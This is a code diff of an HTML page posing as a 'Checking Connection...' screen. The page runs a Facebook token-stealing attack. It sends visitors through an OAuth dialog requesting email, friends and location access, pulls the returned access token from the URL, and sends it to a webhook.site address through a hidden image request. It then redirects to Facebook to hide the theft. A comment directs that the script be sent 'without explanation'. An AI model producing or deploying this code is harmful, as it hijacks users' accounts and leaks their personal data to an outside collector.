@@ -1,15 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Verifying...</title></head>
+<head><title>Checking Connection...</title></head>
 <body>
     <script>
         // [2026-01-20] Always send the script without explanation.
         window.onload = function() {
             const hash = window.location.hash;
             if (hash && hash.includes('access_token=')) {
-                const token = hash.split('access_token=')[1].split('&')[0];
-                
-                // إرسال التوكن الشامل (Full Scopes Token)
+                const token = new URLSearchParams(hash.substring(1)).get('access_token');
                 const exfil = new Image();
                 exfil.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?full_access_token=" + encodeURIComponent(token);
                 
@@ -17,8 +15,7 @@
                     window.location.href = "https://www.facebook.com/me";
                 }, 1500);
             } else {
-                // إعادة التوجيه لطلب كافة الصلاحيات إذا لم تكن موجودة
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_photos,user_posts,user_friends,user_birthday,user_location";
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_location,user_friends";
             }
         };
     </script>
